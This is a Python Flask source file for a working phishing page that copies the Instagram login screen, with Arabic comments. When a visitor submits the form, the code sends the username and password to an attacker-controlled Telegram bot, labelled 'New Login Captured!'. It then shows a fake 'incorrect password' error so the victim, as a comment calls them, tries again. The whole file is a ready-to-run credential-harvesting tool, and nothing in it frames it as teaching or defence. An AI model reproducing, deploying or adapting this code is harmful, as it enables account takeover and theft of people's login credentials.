import os
import re
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "your_secret_key_here")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com"

# تصميم صفحة تسجيل الدخول المطورة والمطابقة للأصل مع دعم رسائل الخطأ
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * {
            box-sizing: border-box;
        }
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            width: 350px;
            padding: 40px 40px 20px 40px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            font-family: 'Instagram Billabong', sans-serif;
            font-size: 45px;
            margin-bottom: 30px;
            font-weight: normal;
        }
        .logo img {
            width: 175px;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            font-size: 12px;
            margin-bottom: 6px;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        .btn {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            width: 100%;
            padding: 7px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 10px;
            cursor: pointer;
        }
        .btn:active {
            opacity: 0.7;
        }
        .error-msg {
            color: #ed4956;
            font-size: 14px;
            margin-bottom: 15px;
            line-height: 18px;
        }
        .signup-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            width: 350px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-container a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/7d29ab426683.png" alt="Instagram">
        </div>
        
        {% if error %}
            <div class="error-msg">{{ error }}</div>
        {% endif %}

        <form method="POST">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn">Log in</button>
        </form>
    </div>

    <div class="signup-container">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def login():
    error = ""
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        # تنسيق رسالة التليجرام بشكل مرتب وأنيق
        text = f"🚨 New Login Captured!\n\n👤 Username/Phone: {username}\n🔑 Password: {password}"
        
        if BOT_TOKEN and CHAT_ID:
            try:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": CHAT_ID, "text": text}
                )
            except Exception as e:
                print(f"Telegram Error: {e}")
                
        # إظهار رسالة خطأ وهمية لإعادة توجيه الضحية لاحقاً أو طلب إعادة المحاولة
        error = "Sorry, your password was incorrect. Please double-check your password."
        
    return render_template_string(HTML_TEMPLATE, error=error)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
